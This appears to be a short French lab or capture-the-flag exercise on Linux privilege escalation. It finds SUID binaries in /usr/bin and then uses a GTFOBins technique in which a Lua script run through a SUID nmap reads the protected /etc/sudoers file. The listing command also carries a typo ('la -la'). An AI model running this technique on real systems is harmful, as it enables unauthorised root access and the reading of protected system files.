# Exercice 6

### Maintenant en possession d’un compte à la base de données – nous allons déployer une autre technique pour obtenir un accès root. 
- Trouvez un binaire que nous pouvons utiliser en tant que root (suid)
```bash	
cd /usr/bin
la -la
```
On trouve que nmap est un binaire suid.

- Trouvez une élévation possible sur https://gtfobins.github.io/ 
```bash
TF=$(mktemp)
echo 'local f=io.open("/etc/sudoers", "rb"); print(f:read("*a")); io.close(f);' > $TF
nmap --script=$TF
```